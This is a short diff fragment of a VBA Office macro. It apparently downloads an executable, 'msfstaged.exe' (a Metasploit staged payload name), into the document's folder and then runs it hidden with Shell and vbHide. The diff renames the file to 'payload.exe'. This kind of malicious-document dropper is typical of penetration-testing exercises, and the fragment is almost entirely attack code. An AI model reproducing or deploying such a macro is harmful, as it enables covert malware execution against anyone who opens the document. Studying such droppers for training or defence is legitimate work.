@@ -17,7 +17,7 @@ Sub MyMacro()
 	'msfstaged.exe')"  
 	Shell str, vbHide  
 	Dim exePath As String  
-	exePath = ActiveDocument.Path + "\msfstaged.exe"  
+	exePath = ActiveDocument.Path + "\payload.exe"  
 	Wait (2)  
 	Shell exePath, vbHide  
 End Sub 
